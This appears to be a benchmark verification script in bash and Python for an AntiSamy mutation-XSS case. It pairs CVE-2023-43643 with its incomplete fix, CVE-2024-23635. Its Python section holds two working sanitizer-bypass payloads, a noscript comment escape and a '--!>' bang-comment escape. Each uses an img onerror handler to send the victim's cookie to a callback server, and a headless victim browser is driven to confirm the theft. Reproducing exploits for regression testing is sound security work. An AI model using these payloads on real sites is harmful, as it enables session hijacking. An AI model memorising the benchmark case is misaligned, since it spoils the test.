#!/usr/bin/env bash
# =====================================================================
# PCBV2-0053 antisamy_comment_mxss
#   pair: CVE-2023-43643 -> CVE-2024-23635 (preserved-comment mXSS / CWE-79)
#   seed     (CVE-2023-43643): raw-text 元素 + 注释逃逸
#            `<div><noscript><!--</noscript><img src=x onerror=...>--></div>`
#            -> V0 (AntiSamy 1.7.3 + neko 3.1.0) 把 <img onerror> 从保留注释里
#            漏成活元素 -> 受害者浏览器 onerror 执行 -> 读 cookie(PCB_FLAG) ->
#            导航到内部 callback -> /dump 出现 flag。V1 (1.7.4) 修复后留在
#            注释内 -> 惰性 -> 阻断。
#   residual (CVE-2024-23635): bang-comment 终结符 `--!>` 逃逸
#            `<div><!--<div/>--!><img src=x onerror=...> <li>--></p></div>`
#            -> V1 (1.7.4, neko 3.6.0 仍错解 `--!>`) 逃逸 -> 达 flag（不完整修复）；
#            V2 (1.7.5, neko 3.11.1 + serializer 修复) 阻断。
#   效果通道 = 内部 callback 的 /dump（记录 /c?f=session=<flag> 命中）
#   判定基准 = RUN_FLAG（提交值）：正常 seed 时 RUN_FLAG=平台真 flag；wrong/stale
#             检查时 RUN_FLAG=提交的 override（通道含真 flag≠override -> 10）。
#   退出码：0=效果发生 10=未发生 20=环境失败 30=参数错误
# =====================================================================
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR" 2>/dev/null || true

if [[ -n "${WORK_DIR:-}" && -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

dc() { docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" "$@"; }

APP_PORT=""; CB_PORT=""; VIC_PORT=""
for _ in $(seq 1 60); do
  APP_PORT="$(dc port "$VERSION" 80 2>/dev/null | head -1 | sed -E 's/^.*:([0-9]+)$/\1/' | tr -d '[:space:]')"
  CB_PORT="$(dc port callback 9000 2>/dev/null | head -1 | sed -E 's/^.*:([0-9]+)$/\1/' | tr -d '[:space:]')"
  VIC_PORT="$(dc port victim 8070 2>/dev/null | head -1 | sed -E 's/^.*:([0-9]+)$/\1/' | tr -d '[:space:]')"
  if [[ -n "$APP_PORT" && -n "$CB_PORT" && -n "$VIC_PORT" ]]; then
    break
  fi
  sleep 2
done
APP_PORT="${APP_PORT:-${PUBLISHED_PORT:-}}"
case "$VERSION" in
  v0) APP_PORT="${APP_PORT:-${PORT_V0_0:-}}";;
  v1) APP_PORT="${APP_PORT:-${PORT_V1_0:-}}";;
  v2) APP_PORT="${APP_PORT:-${PORT_V2_0:-}}";;
esac
CB_PORT="${CB_PORT:-${PORT_CALLBACK_0:-}}"
VIC_PORT="${VIC_PORT:-${PORT_VICTIM_0:-}}"
if [[ -z "$APP_PORT" || -z "$CB_PORT" || -z "$VIC_PORT" ]]; then
  echo "ERR: cannot resolve published ports (app=$APP_PORT cb=$CB_PORT vic=$VIC_PORT; need --profile)" >&2
  exit 20
fi
export PCB_TARGET_PORT="$APP_PORT"

# 就绪等待：victim /health 现在会探 grid。失败则拉起 sidecar 再等。
ready=0
for _ in $(seq 1 45); do
  if curl -fsS --max-time 5 "http://127.0.0.1:${APP_PORT}/health" >/dev/null 2>&1 \
     && curl -fsS --max-time 5 "http://127.0.0.1:${CB_PORT}/health" >/dev/null 2>&1 \
     && curl -fsS --max-time 5 "http://127.0.0.1:${VIC_PORT}/health" >/dev/null 2>&1; then
    ready=1
    break
  fi
  dc up -d --no-deps callback browser victim >/dev/null 2>&1 || true
  sleep 3
done
if [[ "$ready" != 1 ]]; then
  echo "verify: stack not healthy (app:$APP_PORT cb:$CB_PORT vic:$VIC_PORT)" >&2
  dc ps >&2 || true
  exit 20
fi

# 执行 + 判定（与 poc_common.py / seed_exec.py 一致：reset callback -> 驱动 victim
# 访问 sanitizer 页面 -> 读 callback dump；seed 用 raw-text breakout，residual 用
# bang-comment breakout。v1 的受害者 cookie=容器内 PCB_FLAG。）
"$PY" - "$APP_PORT" "$CB_PORT" "$VIC_PORT" "$RUN_FLAG" "$MODE" "$VERSION" "$CASE_DIR" <<'PYEOF'
import sys, time, urllib.parse, urllib.request

app_port, cb_port, vic_port, flag, mode, version, case_dir = sys.argv[1:8]
sys.path.insert(0, case_dir)
from poc_common import INTERNAL_APP, CB  # noqa: E402

PAYLOAD_SEED = (
    "<div><noscript><!--</noscript>"
    "<img src=x onerror=\"document.location='" + CB + "'+document.cookie\">--></div>"
)
PAYLOAD_BYPASS = (
    "<div><!--<div/>--!>"
    "<img src=x onerror=\"document.location='" + CB + "'+document.cookie\"> <li>--></p></div>"
)
payload = PAYLOAD_SEED if mode == "--seed" else PAYLOAD_BYPASS

def _get(url, timeout=120):
    with urllib.request.urlopen(url, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")

callback = f"http://127.0.0.1:{cb_port}"
victim = f"http://127.0.0.1:{vic_port}"
dump = ""
last_err = None
for attempt in range(4):
    try:
        _get(callback + "/reset", timeout=15)
        target = INTERNAL_APP[version] + "/?html=" + urllib.parse.quote(payload, safe="")
        q = urllib.parse.urlencode(
            {"target": target, "origin": INTERNAL_APP[version] + "/", "mode": "load"}
        )
        _get(victim + "/visit?" + q, timeout=120)
        dump = _get(callback + "/dump", timeout=15)
        last_err = None
        break
    except Exception as e:  # noqa: BLE001
        last_err = e
        time.sleep(8)

if last_err is not None:
    print(f"[verify {mode}] error: {type(last_err).__name__}: {last_err}", file=sys.stderr)
    sys.exit(20)

print(f"[verify {mode}] version={version}")
print(f"callback dump: {dump[:400]}")
sys.exit(0 if flag in dump else 10)
PYEOF
RC=$?
echo "verify[$MODE] version=$VERSION rc=$RC (judge_flag=$RUN_FLAG)" >&2
exit "$RC"
